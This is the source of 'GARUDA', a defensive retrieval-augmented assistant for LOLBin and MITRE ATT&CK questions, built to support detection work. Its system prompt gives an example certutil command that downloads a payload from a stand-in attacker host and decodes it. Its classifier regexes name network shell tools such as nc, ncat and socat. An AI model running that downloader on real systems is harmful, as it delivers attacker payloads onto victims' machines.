"""
LOTL Assistant — RAG with classification + hybrid search + reranking.
Usage:
    python assistant.py "your question"
    python assistant.py                (interactive)
"""

import os
import sys
import re
import difflib
import chromadb
import ollama
from chromadb.utils import embedding_functions
from sentence_transformers import CrossEncoder

# ============ CONFIG ============
CHROMA_HOST     = os.getenv("CHROMA_HOST", "localhost")
CHROMA_PORT     = int(os.getenv("CHROMA_PORT", "8000"))
OLLAMA_HOST     = os.getenv("OLLAMA_HOST", "http://localhost:11434")
EMBED_MODEL     = "BAAI/bge-small-en-v1.5"
RERANK_MODEL    = "cross-encoder/ms-marco-MiniLM-L-6-v2"
LLM_MODEL       = os.getenv("GARUDA_MODEL", "deepseek-r1:14b")
REWRITER_MODEL  = os.getenv("GARUDA_REWRITER", "llama3.1:8b")
TOP_K           = 5
CANDIDATES      = 25
VAULT_BASE      = os.getenv("VAULT_BASE", r"D:\GARUDA\obsidian_vault\MITRE_ATTACK")
# ================================

SYSTEM_PROMPT = """You are GARUDA, a defensive cybersecurity assistant specializing in Living Off the Land (LOTL), LOLBins, detection engineering, and MITRE ATT&CK.

Answer format (ALWAYS, no exceptions):

**Summary**
One or two sentences answering the question directly.

## Details
Bullets, commands, tables. Use `##` headers to organize.

## Detection
Concrete detection guidance: Sigma rule names, Event IDs, command-line patterns.

## References
- [Note title] — collection/note_name

Hard rules:
1. Synthesize a NEW answer. Do NOT copy raw notes verbatim.
2. NEVER output [^fn1], YAML frontmatter, [[wikilinks]], or `tags:` blocks.
3. NEVER invent URLs. If a URL is malformed, omit it.
4. If context is insufficient, say so. Do not hallucinate.
5. Stay in scope: LOTL, LOLBins, GTFOBins, MITRE ATT&CK, Sigma, CTI.
6. Do not echo the user's question back.
7. If the retrieved context contains chunks from DIFFERENT scenarios or campaigns, DO NOT combine them into a single invented attack chain. Instead, present each scenario separately with its own heading. If the user asked for "an attack chain" and multiple unrelated scenarios were retrieved, say: "The vault returned multiple scenarios. Here is the most relevant one:" and pick the single highest-scoring scenario.
8. NEVER invent causality between separate commands. If chunk A shows 'net localgroup' being used for persistence and chunk B shows 'verclsid' being used for COM execution, do NOT write "Step 1: reconnaissance via verclsid. Step 2: persistence via net localgroup." These are from different scenarios. Do not stitch them.

Example:

User: How do attackers use certutil?

**Summary**
certutil.exe is a signed Windows utility abused for payload download and base64 decoding — a classic LOTL downloader.

## Details
- Download: `certutil -urlcache -split -f http://attacker/payload.exe payload.exe`
- Decode: `certutil -decode encoded.txt payload.exe`

## Detection
- Sigma: `proc_creation_win_certutil_download`
- Event ID 4688: certutil.exe with `-urlcache` and network egress to non-Microsoft hosts.

## References
- certutil — lolbins/certutil
"""

FOOTNOTE_RE = re.compile(r"\[\^[^\]]+\]")
WIKILINK_RE = re.compile(r"\[\[([^\]|]+)(?:\|([^\]]+))?\]\]")
YAML_FM_RE  = re.compile(r"^---\s*\n.*?\n---\s*\n", re.DOTALL)


# =====================================================================
# VAULT-NAME LOADING
# =====================================================================
def load_names():
    malware, tools = set(), set()
    for folder, target in [("Malwares", malware), ("Tools", tools)]:
        folder_path = os.path.join(VAULT_BASE, folder)
        if not os.path.isdir(folder_path):
            continue
        for fn in os.listdir(folder_path):
            if fn.endswith(".md"):
                name = fn[:-3].lower().strip()
                norm = re.sub(r"[^a-z0-9]", "", name)
                if len(norm) >= 4:
                    target.add((norm, name))
    return malware, tools

MALWARE_NAMES, TOOL_NAMES = load_names()


# =====================================================================
# PATTERNS
# =====================================================================
BINARY_PATTERN = re.compile(
    r"\b(certutil|mshta|rundll32|regsvr32|wmic|powershell|bitsadmin|msbuild|"
    r"installutil|schtasks|vssadmin|wbadmin|nslookup|netsh|cmstp|cscript|"
    r"wscript|xcopy|reg\.exe|cmdkey|cmdl32|esentutl|eventvwr|expand|extrac32|"
    r"findstr|forfiles|fsutil|ftp|gpscript|certoc|certreq|pcalua|pcwrun|"
    r"presentationhost|replace|rpcping|runonce|sc\.exe|scriptrunner|tttracer|"
    r"verclsid|wsl|wsreset|msiexec|odbcconf|regasm|regsvcs|mavinject|xwizard)"
    r"(\.exe)?\b",
    re.IGNORECASE,
)

UNIX_BINARIES = re.compile(
    r"\b(bash|sh|zsh|dash|ksh|fish|"
    r"python3?|perl|ruby|node|php|"
    r"curl|wget|nc|ncat|netcat|socat|telnet|"
    r"find|awk|sed|grep|tar|zip|unzip|"
    r"nmap|ssh|scp|rsync|sftp|"
    r"vim|vi|nano|emacs|less|more|"
    r"systemctl|journalctl|crontab|"
    r"dd|cp|mv|ln|chmod|chown|"
    r"env|nohup|watch|xargs|taskset|"
    r"docker|kubectl|ansible|"
    r"openssl|gpg|ssh-keygen|"
    r"apt|yum|dnf|pacman|npm)\b",
    re.IGNORECASE,
)

DETECTION_KEYWORDS = re.compile(
    r"\b(detect|detection|sigma|rule|alert|trigger|"
    r"log source|event id|sysmon|audit|indicator|"
    r"how to catch|how to spot|how to detect|"
    r"rule for|rules for)\b",
    re.IGNORECASE,
)

CAMPAIGN_KEYWORDS = re.compile(
    r"\b(scenario|campaign|real-world|attack chain|chain of|"
    r"how do attackers chain|show me an attack|multi-step|"
    r"walk me through|step.by.step|real attack)\b",
    re.IGNORECASE,
)

TECHNIQUE_PATTERN = re.compile(r"\bT\d{4}(\.\d{3})?\b", re.IGNORECASE)


# =====================================================================
# HARDCODED TYPO MAP
# =====================================================================
COMMON_TYPOS = {
    "run32dll": "rundll32", "rundll": "rundll32", "rundll32": "rundll32",
    "rundll3": "rundll32", "rundel32": "rundll32", "run32": "rundll32",
    "mshata": "mshta", "mshta": "mshta", "mshataexe": "mshta",
    "certuil": "certutil", "certutl": "certutil", "certu": "certutil",
    "certutil": "certutil",
    "regsrv32": "regsvr32", "regsvr": "regsvr32", "regsrv": "regsvr32",
    "regsvr32": "regsvr32",
    "psh": "powershell", "powershel": "powershell",
    "powershell": "powershell", "pwsh": "powershell",
    "wmic": "wmic", "wmi": "wmic",
    "bitsadmin": "bitsadmin",
    "schtask": "schtasks", "schtasks": "schtasks",
    "vssadmin": "vssadmin", "wbadmin": "wbadmin",
    "nslookup": "nslookup", "nslook": "nslookup",
    "netsh": "netsh", "cmstp": "cmstp", "cscript": "cscript",
    "wscript": "wscript", "xcopy": "xcopy", "cmdkey": "cmdkey",
    "esentutl": "esentutl", "findstr": "findstr", "forfiles": "forfiles",
    "fsutil": "fsutil", "mavinject": "mavinject", "verclsid": "verclsid",
    "bcdedit": "bcdedit", "installutil": "installutil",
    "msbuild": "msbuild", "msxsl": "msxsl", "addinutil": "addinutil",
    "regasm": "regasm", "regsvcs": "regsvcs", "wsl": "wsl",
    "wsreset": "wsreset", "msiexec": "msiexec", "odbcconf": "odbcconf",
    "pcalua": "pcalua", "pcwrun": "pcwrun", "rpcping": "rpcping",
    "tttracer": "tttracer", "xwizard": "xwizard",
    "mimikatz": "mimikatz", "mimi": "mimikatz",
    "cobaltstrike": "cobalt strike", "cobalt": "cobalt strike",
    "bloodhound": "bloodhound", "metasploit": "metasploit",
}


# =====================================================================
# OUT-OF-SCOPE DETECTION — 4 layers + typo map
# =====================================================================

IN_SCOPE_WHITELIST = re.compile(
    r"\b("
    r"certutil|mshta|rundll32|regsvr32|wmic|bitsadmin|msbuild|installutil|"
    r"schtasks|vssadmin|wbadmin|nslookup|netsh|cmstp|cscript|wscript|"
    r"xcopy|cmdkey|esentutl|expand|extrac32|findstr|forfiles|fsutil|"
    r"gpscript|certoc|certreq|pcalua|pcwrun|presentationhost|rpcping|"
    r"sc\.exe|tttracer|verclsid|wsl|wsreset|msiexec|odbcconf|regasm|"
    r"regsvcs|mavinject|xwizard|msxsl|addinutil|csc\.exe|dfshim|"
    r"curl|wget|bash|zsh|python|perl|ruby|node|php|netcat|socat|"
    r"nmap|ssh|rsync|systemctl|crontab|docker|kubectl|"
    r"lolbin|lolbins|gtfobin|gtfobins|lotl|"
    r"sigma|sysmon|mitre|att&ck|technique|tactic|ttp|"
    r"detection rule|event id|log source|"
    r"privilege escalation|persistence|lateral movement|"
    r"exfiltration|credential dump|process injection|"
    r"reverse shell|bind shell|payload|beacon|c2|"
    r"malware|ransomware|trojan|backdoor|rootkit|"
    r"certificate|kerberos|lsass|sam database|golden ticket|"
    r"registry run key|startup folder|scheduled task|"
    r"bloodhound|mimikatz|cobalt strike|empire|metasploit|"
    r"adversary|threat actor|apt|attack chain|kill chain|"
    r"T\d{4}(\.\d{3})?"
    r")\b",
    re.IGNORECASE,
)

LOOSE_SECURITY_SIGNAL = re.compile(
    r"\b(attack|attackers?|adversar\w*|defend|defensive|defence|defense|"
    r"exploit\w*|vulnerab\w*|threat\w*|malicious|"
    r"inject\w*|escalat\w*|pivot\w*|loot\w*|"
    r"network\w*|endpoint\w*|forensic\w*|incident\w*|"
    r"password\w*|credential\w*|hash\w*|encrypt\w*|decrypt\w*|"
    r"command\w*|script\w*|binary|binaries|process\w*|registry\w*|"
    r"windows|linux|macos|kernel|driver\w*|service\w*|"
    r"firewall|antivirus|edr|siem|soc|pentest\w*|hunt\w*|"
    r"kill chain|ioc|indicator\w*|patch\w*|cve|zero.day|"
    r"ransom\w*|exfil\w*|implant\w*|dropper\w*|loader\w*|"
    r"evasion|abuse|misuse|recon\w*|discov\w*|"
    r"port\w*|protocol\w*|dns|http|ssh|smb|rdp|"
    r"permission\w*|admin\w*|system\w*|user\w*|account\w*)"
    r"\b",
    re.IGNORECASE,
)

OFF_TOPIC_KEYWORDS = [
    "trading", "trade", "stocks", "stock market", "invest", "investment",
    "crypto", "cryptocurrency", "bitcoin", "ethereum", "forex", "portfolio",
    "dividend", "broker", "wall street", "day trading", "swing trading",
    "mutual fund", "index fund",
    "recipe", "cooking", "baking", "meal prep", "restaurant", "biryani", "pasta",
    "workout", "exercise routine", "diet plan", "weight loss",
    "girlfriend", "boyfriend", "dating", "relationship advice", "breakup",
    "movie", "netflix", "tv show", "song", "lyrics", "music theory",
    "celebrity", "youtube channel", "joke", "riddle",
    "football", "soccer", "cricket", "basketball", "tennis",
    "flight booking", "hotel booking", "vacation",
    "buy iphone", "buy laptop", "which phone", "best camera",
    "homework", "assignment help", "write my essay", "write a poem",
    "solve this equation", "math problem",
    "learn coding", "learn python from scratch", "teach me javascript",
    "how to code in", "python tutorial",
    "my computer", "my pc", "my laptop", "why is my",
    "computer is slow", "won't boot", "will not boot",
    "wifi not working", "windows update stuck", "blue screen", "bsod",
    "printer not working", "email not sending", "my phone",
    "my iphone", "my android", "my router",
    "weather in", "what time is it", "who is the president",
    "how to get rich", "how to make money",
    "resume", "cover letter", "job interview",
    "dating app", "tinder", "bumble",
    "hello", "hi ", " hey", "good morning", "good night",
    "how are you", "what's up", "who are you",
    "tell me a story", "sing a song", "say something",
]

REFUSAL_MESSAGE = (
    "I'm GARUDA, a specialist cybersecurity assistant. I only answer "
    "questions about Living Off the Land (LOTL) techniques, LOLBins, "
    "GTFOBins, MITRE ATT&CK, Sigma detection rules, and threat campaigns. "
    "I can't help with that question — it's outside my scope."
)


def fuzzy_binary_match(query: str):
    """
    Match typos of common binary names. Returns corrected name or None.
    Two passes: (1) hardcoded typo map, (2) fuzzy fallback.
    """
    ql = query.lower()
    # Pass 1 — hardcoded typo map (word-boundary match)
    for key in COMMON_TYPOS:
        if re.search(r"\b" + re.escape(key) + r"\b", ql):
            return COMMON_TYPOS[key]
    # Pass 2 — fuzzy fallback with looser cutoff
    words = re.findall(r"[a-z][a-z0-9]{3,}", ql)
    targets = list(set(COMMON_TYPOS.values()))
    for w in words:
        matches = difflib.get_close_matches(w, targets, n=1, cutoff=0.65)
        if matches and matches[0] != w:
            return matches[0]
    return None


def is_out_of_scope(query: str):
    """
    Returns (is_off_topic, reason).

    Order (first match wins):
      1. Too short → refuse
      2. Whitelist match → accept
      3. Fuzzy/typo match → accept
      4. Off-topic keyword → refuse
      5. Loose security signal → accept
      6. No signal at all → refuse
    """
    q = query.strip()
    if len(q) < 2:
        return True, "too_short"

    if IN_SCOPE_WHITELIST.search(q):
        return False, "in_scope_whitelist"

    fuzzy = fuzzy_binary_match(q)
    if fuzzy:
        return False, f"fuzzy_binary:{fuzzy}"

    ql = q.lower()
    for kw in OFF_TOPIC_KEYWORDS:
        if kw in ql:
            return True, f"off_topic:{kw}"

    if LOOSE_SECURITY_SIGNAL.search(q):
        return False, "loose_security_signal"

    return True, "no_security_signal"


# =====================================================================
# CLASSIFIER
# =====================================================================
def classify_query(q: str):
    """Route the query to the best collection."""
    is_off, reason = is_out_of_scope(q)
    if is_off:
        print(f"   [refused: {reason}]")
        return "OUT_OF_SCOPE", None

    ql = q.lower()

    m = TECHNIQUE_PATTERN.search(q)
    if m:
        return "techniques", m.group(0).upper()

    if DETECTION_KEYWORDS.search(q):
        m = BINARY_PATTERN.search(q)
        if m:
            return "detection_rules", m.group(1).lower().replace(".exe", "")
        m = UNIX_BINARIES.search(q)
        if m:
            return "detection_rules", m.group(1).lower()
        return "detection_rules", None

    if CAMPAIGN_KEYWORDS.search(q):
        return "campaigns", None

    m = BINARY_PATTERN.search(q)
    if m:
        return "lolbins", m.group(1).lower().replace(".exe", "")

    fuzzy = fuzzy_binary_match(q)
    if fuzzy:
        return "lolbins", fuzzy

    m = UNIX_BINARIES.search(q)
    if m:
        return "gtfobins", m.group(1).lower()

    ql_norm = re.sub(r"[^a-z0-9]", "", ql)
    for norm, original in MALWARE_NAMES:
        if norm in ql_norm:
            return "malware", original
    for norm, original in TOOL_NAMES:
        if norm in ql_norm:
            return "tools", original

    if any(w in ql for w in ["malware", "trojan", "ransomware", "backdoor", "rat "]):
        return "malware", None

    if any(w in ql for w in ["download file", "download files", "fetch file",
                              "fetch files", "built-in tool", "built-in binary",
                              "system binary", "encode file", "decode file"]):
        return "lolbins", None

    if any(w in ql for w in ["mitre tool", "attack tool", "utility software"]):
        return "tools", None
    if any(w in ql for w in ["tactic", "phase", "stage", "kill chain"]):
        return "tactics", None

    return "techniques", None


# =====================================================================
# CLIENTS
# =====================================================================
_reranker = None
_client = None
_embed_fn = None
_ollama = None


def get_reranker():
    global _reranker
    if _reranker is None:
        _reranker = CrossEncoder(RERANK_MODEL)
    return _reranker


def get_client():
    global _client
    if _client is None:
        _client = chromadb.HttpClient(host=CHROMA_HOST, port=CHROMA_PORT)
    return _client


def get_embed_fn():
    global _embed_fn
    if _embed_fn is None:
        _embed_fn = embedding_functions.SentenceTransformerEmbeddingFunction(
            model_name=EMBED_MODEL
        )
    return _embed_fn


def get_ollama():
    global _ollama
    if _ollama is None:
        _ollama = ollama.Client(host=OLLAMA_HOST)
    return _ollama


# =====================================================================
# RETRIEVAL — with MIN_SCORE floor + campaign lock-on
# =====================================================================
def retrieve(question, collection_name, entity, top_k=TOP_K, candidates=CANDIDATES):
    client = get_client()
    embed_fn = get_embed_fn()
    try:
        coll = client.get_collection(name=collection_name, embedding_function=embed_fn)
    except Exception:
        coll = client.get_collection(name="techniques", embedding_function=embed_fn)

    # Exact technique ID match
    if entity and re.match(r"^T\d{4}(\.\d{3})?$", entity):
        print(f"   [using exact ID match for {entity}]")
        try:
            results = coll.get(
                where={"technique_id": entity},
                limit=candidates,
                include=["documents", "metadatas"],
            )
            id_docs = results["documents"]
            id_metas = results["metadatas"]
            if id_docs:
                top = list(zip(id_docs, id_metas))[:top_k]
                return [t[0] for t in top], [t[1] for t in top]
        except Exception as e:
            print(f"   [ID filter failed: {e}]")

    # Filename match for tools / malware / binaries
    if entity and collection_name in ("malware", "tools", "lolbins", "gtfobins"):
        try:
            results = coll.get(
                where={"filename": entity},
                limit=candidates,
                include=["documents", "metadatas"],
            )
            f_docs = results["documents"]
            f_metas = results["metadatas"]
            if f_docs:
                top = list(zip(f_docs, f_metas))[:top_k]
                return [t[0] for t in top], [t[1] for t in top]
        except Exception as e:
            print(f"   [filename lookup skipped: {e}]")

    # Semantic search + rerank
    n_fetch = max(candidates, 50) if collection_name == "campaigns" else candidates
    results = coll.query(query_texts=[question], n_results=n_fetch)
    docs = results["documents"][0]
    metas = results["metadatas"][0]

    if not docs:
        return [], []

    reranker = get_reranker()
    pairs = [(question, d) for d in docs]
    scores = reranker.predict(pairs)

    scored = []
    ent_l = entity.lower() if entity else None
    for doc, meta, score in zip(docs, metas, scores):
        bonus = 0.0
        if ent_l:
            if ent_l in meta.get("source", "").lower():
                bonus += 5.0
            if ent_l in doc.lower():
                bonus += 1.0
        scored.append((score + bonus, doc, meta))

    scored.sort(key=lambda x: -x[0])

    # Reject low-confidence retrievals
    MIN_SCORE = -4.0
    if scored and scored[0][0] < MIN_SCORE:
        print(f"   [retrieval rejected: top score {scored[0][0]:.2f} < {MIN_SCORE}]")
        return [], []

    # ===== Campaign lock-on: return chunks from a SINGLE scenario =====
    if collection_name == "campaigns":
        top_src = scored[0][2].get("source", "?")
        print(f"   [campaign lock-on: {top_src}]")
        picked = []
        for score, doc, meta in scored:
            if meta.get("source") == top_src:
                picked.append((score, doc, meta))
                if len(picked) >= top_k:
                    break
        # Supplement with more chunks from the same source if needed
        if len(picked) < top_k:
            try:
                extra = coll.get(
                    where={"source": top_src},
                    limit=15,
                    include=["documents", "metadatas"],
                )
                seen_docs = {t[1] for t in picked}
                for doc, meta in zip(extra["documents"], extra["metadatas"]):
                    if doc in seen_docs:
                        continue
                    picked.append((0, doc, meta))
                    seen_docs.add(doc)
                    if len(picked) >= top_k:
                        break
            except Exception:
                pass
        return [t[1] for t in picked], [t[2] for t in picked]

    # ===== Non-campaign: dedupe by source =====
    MAX_PER_SOURCE = 2
    picked = []
    per_source_count = {}
    for score, doc, meta in scored:
        src = meta.get("source", "?")
        if per_source_count.get(src, 0) >= MAX_PER_SOURCE:
            continue
        picked.append((score, doc, meta))
        per_source_count[src] = per_source_count.get(src, 0) + 1
        if len(picked) >= top_k:
            break

    return [t[1] for t in picked], [t[2] for t in picked]


# =====================================================================
# POST-PROCESSING
# =====================================================================
def strip_thinking(text: str) -> str:
    text = re.sub(r"<think>.*?</think>", "", text, flags=re.DOTALL)
    text = re.sub(r"</?think>", "", text)
    return text.strip()


def strip_bad_urls(text: str) -> str:
    text = re.sub(r"https?://\S*(?:\.\.\.|\[…\]|…)\S*", "", text)
    text = re.sub(r"https?://(?=\s|$)", "", text)
    text = re.sub(
        r"https?://(?:malicious-site|attacker|example\.com|evil\.com|"
        r"domain\.com|your-domain|localhost|attacker\.com)[^\s`]*",
        "", text,
    )
    text = re.sub(r"https?://(?=[`\s]|$)", "", text)
    text = re.sub(r"(https?://\S+)[.,;:!?](?=\s|$)", r"\1", text)
    return text


def clean_reply(text: str) -> str:
    text = strip_thinking(text)
    text = FOOTNOTE_RE.sub("", text)
    text = WIKILINK_RE.sub(lambda m: m.group(2) or m.group(1), text)
    text = strip_bad_urls(text)
    text = re.sub(r"[ \t]+\n", "\n", text)
    text = re.sub(r"\n{3,}", "\n\n", text)
    return text.strip()


def ask_llm(question, context, collection_used):
    user_prompt = f"""Retrieved from collection '{collection_used}'.

Context:

{context}

---

Question: {question}

Answer using only the context above."""

    response = get_ollama().chat(
        model=LLM_MODEL,
        messages=[
            {"role": "system", "content": SYSTEM_PROMPT},
            {"role": "user", "content": user_prompt},
        ],
        options={"num_predict": 4096},
    )

    msg = getattr(response, "message", None) or response["message"]
    content  = getattr(msg, "content",  "") or ""
    thinking = getattr(msg, "thinking", "") or ""

    raw = content if content.strip() else thinking
    return clean_reply(raw)


def build_context(docs, metas):
    parts = []
    for i, (doc, meta) in enumerate(zip(docs, metas), start=1):
        src = meta.get("source", "unknown")
        parts.append(f"[Chunk {i}] source={src}\n{doc}")
    return "\n\n---\n\n".join(parts)


REFERENCES_HEADER_RE = re.compile(
    r"^[ \t]*[#*_> \t]*(?:references|sources)[ \t*_:]*$",
    re.IGNORECASE | re.MULTILINE,
)


def ensure_references(reply: str, metas) -> str:
    if not reply:
        return reply
    if REFERENCES_HEADER_RE.search(reply):
        return reply

    seen, lines = set(), []
    for meta in metas:
        src = meta.get("source", "").strip()
        if src and src not in seen:
            seen.add(src)
            lines.append(f"- {src}")

    if not lines:
        return reply

    return reply.rstrip() + "\n\n## References\n" + "\n".join(lines) + "\n"


# =====================================================================
# QUERY REWRITER
# =====================================================================
def rewrite_query(question, history):
    if not history:
        return question

    if re.search(r"\bT\d{4}(\.\d{3})?\b", question):
        return question

    convo = "\n".join(
        f"{m['role'].capitalize()}: {m['content'][:150]}"
        for m in history[-4:]
    )

    prompt = f"""You are a query rewriter. Rewrite the user's latest message into
a short standalone search query for a cybersecurity knowledge base.

Rules:
- Output ONLY the rewritten query — no prefix, no quotes, no explanation.
- Keep it under 20 words.
- Include the tool/technique name from context if the message uses "that", "it", or "this".

Conversation:
{convo}

Latest message: {question}

Rewritten query:"""

    try:
        resp = get_ollama().chat(
            model=REWRITER_MODEL,
            messages=[{"role": "user", "content": prompt}],
            options={"num_predict": 40, "temperature": 0.1},
        )
        msg = getattr(resp, "message", None) or resp["message"]
        rewritten = (getattr(msg, "content", "") or "").strip()
        if not rewritten:
            rewritten = (getattr(msg, "thinking", "") or "").strip()

        lines = [ln.strip() for ln in rewritten.split("\n") if ln.strip()]
        if lines:
            rewritten = lines[-1]

        rewritten = re.sub(
            r"^(?:rewritten query|standalone query|query|rewritten)[:\s]*",
            "", rewritten, flags=re.I,
        )
        rewritten = rewritten.strip('"\'' + "`").strip()

        print(f"   [rewrite] '{question}' -> '{rewritten}'")

        if 3 < len(rewritten) < 200:
            return rewritten
        else:
            print(f"   [rewrite REJECTED] len={len(rewritten)}")
    except Exception as e:
        print(f"   [query rewrite failed: {e}]")

    return question


# =====================================================================
# ANSWER_STREAM — SSE generator (with grounding log)
# =====================================================================
def answer_stream(question, history=None):
    """
    Streaming version with stage events for UI visualization.
    Out-of-scope is checked FIRST — emits ("out_of_scope", msg) with no stage events.
    """
    history = history or []

    try:
        # ===== OUT-OF-SCOPE FIRST =====
        is_off, reason = is_out_of_scope(question)
        if is_off:
            print(f"   [refused: {reason}]")
            yield ("out_of_scope", REFUSAL_MESSAGE)
            yield ("done", None)
            return

        # ===== CLASSIFY =====
        yield ("stage", {"stage": "classify", "status": "running"})

        search_q = rewrite_query(question, history)

        if search_q != question:
            yield ("stage", {"stage": "rewrite", "status": "running"})
            yield ("stage", {"stage": "rewrite", "status": "done", "detail": search_q})
        else:
            yield ("stage", {"stage": "rewrite", "status": "skipped"})

        collection, entity = classify_query(search_q)
        yield ("stage", {"stage": "classify", "status": "done",
                         "detail": {"collection": collection, "entity": entity}})

        if collection == "OUT_OF_SCOPE":
            yield ("out_of_scope", REFUSAL_MESSAGE)
            yield ("done", None)
            return

        # ===== RETRIEVE =====
        yield ("stage", {"stage": "retrieve", "status": "running",
                         "detail": {"collection": collection}})

        k = 8 if collection == "campaigns" else TOP_K
        docs, metas = retrieve(search_q, collection, entity, top_k=k)

        if not docs:
            msg = "No matching content found in the knowledge base."
            yield ("token", msg)
            yield ("final", msg)
            yield ("sources", [])
            yield ("done", None)
            return

        def _src_to_id(src: str) -> str:
            s = src.replace("\\", "/")
            if s.endswith(".md"):
                s = s[:-3]
            return s

        retrieved_ids = list(dict.fromkeys(
            _src_to_id(m.get("source", "")) for m in metas if m.get("source")
        ))

        # ── Grounding log ──
        print(f"   [grounding] {len(docs)} chunks from {len(retrieved_ids)} unique source(s):")
        for i, meta in enumerate(metas, 1):
            print(f"      {i}. {meta.get('source', '?')}")

        yield ("stage", {"stage": "retrieve", "status": "done",
                         "detail": {"chunks": len(docs), "nodes": retrieved_ids}})
        yield ("stage", {"stage": "rerank", "status": "done",
                         "detail": {"chunks": len(docs)}})

        context = build_context(docs, metas)

        # ===== GENERATE =====
        yield ("stage", {"stage": "generate", "status": "running"})

        user_prompt = f"""Retrieved from collection '{collection}'.

Context:

{context}

---

Question: {question}

Answer using only the context above."""

        messages = [{"role": "system", "content": SYSTEM_PROMPT}]
        messages.extend(history)
        messages.append({"role": "user", "content": user_prompt})

        stream = get_ollama().chat(
            model=LLM_MODEL,
            messages=messages,
            options={"num_predict": 4096},
            stream=True,
        )

        content_parts = []
        thinking_parts = []
        for chunk in stream:
            msg = getattr(chunk, "message", None) or chunk.get("message", {})
            c = (getattr(msg, "content", "") or "") if hasattr(msg, "content") else (msg.get("content") or "")
            t = (getattr(msg, "thinking", "") or "") if hasattr(msg, "thinking") else (msg.get("thinking") or "")
            if c:
                content_parts.append(c)
                yield ("token", c)
            if t:
                thinking_parts.append(t)

        raw = "".join(content_parts) if content_parts else "".join(thinking_parts)
        cleaned = clean_reply(raw)
        cleaned = ensure_references(cleaned, metas)

        yield ("stage", {"stage": "generate", "status": "done"})
        yield ("final", cleaned)

        seen, sources = set(), []
        for meta in metas:
            src = meta.get("source", "").strip()
            if src and src not in seen:
                seen.add(src)
                sources.append(src)
        yield ("sources", sources)
        yield ("done", None)

    except Exception as e:
        yield ("error", str(e))
        yield ("done", None)


# =====================================================================
# ANSWER — CLI
# =====================================================================
def answer(question, verbose=True):
    is_off, reason = is_out_of_scope(question)
    if is_off:
        if verbose:
            print(f"\n🔍 Question: {question}")
            print(f"   [refused: {reason}]")
            print(f"❌ {REFUSAL_MESSAGE}")
        return REFUSAL_MESSAGE, []

    collection, entity = classify_query(question)
    if verbose:
        print(f"\n🔍 Question: {question}")

    if collection == "OUT_OF_SCOPE":
        if verbose:
            print(f"❌ {REFUSAL_MESSAGE}")
        return REFUSAL_MESSAGE, []

    if verbose:
        print(f"📂 Collection: {collection}" + (f"  |  Entity: {entity}" if entity else ""))
        print("⏳ Retrieving...")

    k = 8 if collection == "campaigns" else TOP_K
    docs, metas = retrieve(question, collection, entity, top_k=k)
    if not docs:
        if verbose:
            print("❌ No results found.")
        return None, []

    if verbose:
        print(f"✓ Retrieved {len(docs)} chunks (post-rerank)")
        for i, meta in enumerate(metas, 1):
            print(f"     {i}. {meta.get('source', '?')}")
        print("🧠 Generating answer...\n")

    context = build_context(docs, metas)
    reply = ask_llm(question, context, collection)
    reply = ensure_references(reply, metas)

    if verbose:
        print("=" * 72)
        print(reply)
        print("=" * 72)
        print("\n📚 Sources:")
        seen = set()
        for meta in metas:
            src = meta.get("source", "unknown")
            if src not in seen:
                seen.add(src)
                print(f"  - {src}")

    sources = []
    seen = set()
    for meta in metas:
        src = meta.get("source", "unknown")
        if src not in seen:
            seen.add(src)
            sources.append(src)

    return reply, sources


def interactive():
    print("LOTL Assistant. Type 'exit' to quit.\n")
    while True:
        try:
            q = input("You: ").strip()
        except (EOFError, KeyboardInterrupt):
            print(); break
        if not q or q.lower() in ("exit", "quit"):
            break
        try:
            answer(q)
        except Exception as e:
            print(f"\n⚠️  Error: {e}\n")


def main():
    if len(sys.argv) > 1:
        answer(" ".join(sys.argv[1:]))
    else:
        interactive()


if __name__ == "__main__":
    main()